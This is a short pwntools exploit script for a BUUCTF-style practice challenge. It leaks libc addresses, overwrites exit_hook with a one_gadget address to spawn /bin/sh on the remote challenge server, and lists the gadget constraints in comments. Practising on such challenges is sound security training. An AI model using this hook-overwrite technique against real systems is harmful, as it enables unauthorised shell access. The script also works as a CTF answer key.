from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn")
io=remote("node4.buuoj.cn",28493)
elf=ELF("./pwn")
libc=ELF("./libc-2.27.so")

io.recvuntil(b"puts: ")
puts_addr=int(io.recvuntil(b"\n",drop=True),16)
print("puts_addr: " + hex(puts_addr))

io.recvuntil(b"stack: ")
stack_addr=int(io.recvuntil(b"\n",drop=True),16)
print("stack_addr: " + hex(stack_addr))


leak_addr=puts_addr-libc.sym[b"puts"]
print("leak_addr: " + hex(leak_addr))

shell=leak_addr+0x4f322
exit_hook=leak_addr+0x619f68

io.sendlineafter(b"t\n",b"w")
io.sendline(str(exit_hook))
io.sendline(str(shell))

io.sendlineafter(b"t\n",b"q")

io.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
